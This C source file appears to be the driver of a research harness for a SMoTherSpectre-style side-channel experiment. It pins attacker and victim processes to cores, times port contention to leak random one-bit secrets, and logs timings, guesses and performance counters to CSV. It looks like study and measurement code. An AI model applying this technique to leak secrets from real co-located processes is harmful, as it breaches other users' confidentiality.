#define _GNU_SOURCE
#include <inttypes.h>
#include <sched.h>  
#include <stdio.h>  
#include <string.h>  

#include "util.h"
#include "synch.h"
#include "pmc.h"
#include "macros.h"
#include "x86intrin.h"

#define NREGS 6
#define NEXPTS 1000

counter programmables[] =
{
  { 0x01410114ull, "ARITH.DIVIDER_ACTIVE"},
  { 0x418489ull, "BR_MISP_EXEC.TAKEN_INDIRECT_JUMP_NON_CALL_RET" },
};

void *ptr;

void pin(unsigned core) { 
	cpu_set_t cpuset;

	CPU_ZERO(&cpuset);
	CPU_SET(core, &cpuset);

  VERIFY(sched_setaffinity(0, sizeof(cpuset), &cpuset) == 0,
    	   "Unable to pin thread");
}

inline uint64_t smotherSpectreIter(synch *s, uint64_t *r64_values, uint64_t secret) {
  register uint64_t tsc;
  unsigned junk;

  /* we set registers "r8", "r9", "r10", "r11", "rbx", "rcx" to random values */
  SET_GP_REGISTERS(r64_values);

  synch_sync(s);

#ifdef ATTACKER
#include "attacker.c"
#else
#include "victim.c"
#endif

  return tsc;
}

/* Use any statistic to figure out secret : we use the mean */
int attacker_guess(uint64_t *timings, int n_timings) {
  uint64_t sum = 0;
  unsigned i;

  for(i = 0; i < n_timings; i++)
    sum += timings[i];

  int guess = (sum > (THRESHOLD * n_timings))? 1: 0;
  
  return guess;
}

int main(int argc, char **argv) {
  synch s;
	unsigned core = 0, i, j, k;
	char proc = 'x', pmc_filename[20];
  size_t n_programmables = sizeof(programmables) / sizeof(programmables[0]);
  uint64_t attacker_times[NEXPTS][NSAMPLES];
  uint64_t ctrs[NEXPTS][NSAMPLES][n_programmables];
  uint64_t *r64_values, secret[NEXPTS];
  FILE *fp_secret, *fp_pmc[n_programmables], *fp_timing, *fp_guess;

  memset(attacker_times, 0, sizeof(attacker_times));
  memset(ctrs, 0, sizeof(ctrs));

	VERIFY(argc >= 3, "Not enough args");
	VERIFY(argv[1][0] == 'a' || argv[1][0] == 'v', 
	 	     "Invalid process type");

  /* Args to local vars */
	proc = argv[1][0];
	sscanf(argv[2], "%u", &core);

	pin(core);
  srand((unsigned)__rdtsc());

#if USE_PMC
  if(proc == 'v')
    setup_pmc(core, programmables, n_programmables);
#endif

  /* Connect to shared memory for synchronization */
  synch_connect(&s);

  r64_values = (uint64_t *)malloc(sizeof(uint64_t) * NREGS);
  for(i = 0; i < NREGS; i++)
    r64_values[i] = __rdtsc() * __rdtsc();

  /* Run NEXPT experiments, each trying to leak one bit */ 
  for(i = 0; i < NEXPTS; i++)
  {
    /* Secret is 0 or 1 (value is meaningless for attacker) */
    secret[i] = rand() % 2;
    /* Attacker gets NSAMPLES with the same victim secret */
    for(j = 0; j < NSAMPLES; j++) {
#if USE_PMC
      if(proc == 'v'){
        zero_pmc(n_programmables);
        start_pmc();
      }
#endif
    	attacker_times[i][j] = smotherSpectreIter(&s, r64_values, secret[i]);
#if USE_PMC
      if(proc == 'v'){
        stop_pmc();
        get_stats(ctrs[i][j], n_programmables);
      } 
#endif
    }
  }

  /* Output stats */
  if(proc == 'v'){
#if USE_PMC
    for(i = 0; i < n_programmables; i++) {
      snprintf(pmc_filename, sizeof(pmc_filename), "victim_pmc%d.csv", i);
      fp_pmc[i] = fopen(pmc_filename, "w+");
    }

    for(i = 0; i < NEXPTS; i++) {
      for(k = 0; k < n_programmables; k++){
        for(j = 0; j < NSAMPLES; j++)
          fprintf(fp_pmc[k], "%"PRIu64", ", ctrs[i][j][k]);
        fprintf(fp_pmc[k], "\n");
      }
    }
    for(i = 0; i < n_programmables; i++)
      fclose(fp_pmc[i]);
#endif

    fp_secret = fopen("victim_secret.csv", "w+");
    for(i = 0; i < NEXPTS; i++)  
      fprintf(fp_secret, "%"PRIu64"\n", secret[i]);
    fclose(fp_secret);
  } else {

    fp_timing = fopen("attack_time.csv", "w+");
    fp_guess = fopen("attack_guess.csv", "w+");
    for(i = 0; i < NEXPTS; i++) {
      for(j = 0; j < NSAMPLES; j++)
        fprintf(fp_timing, "%"PRIu64", ", attacker_times[i][j]);
      fprintf(fp_timing, "\n");
      fprintf(fp_guess, "%d\n", attacker_guess(attacker_times[i], NSAMPLES));
    }
    fclose(fp_timing);
    fclose(fp_guess);
  }

  free(r64_values);
}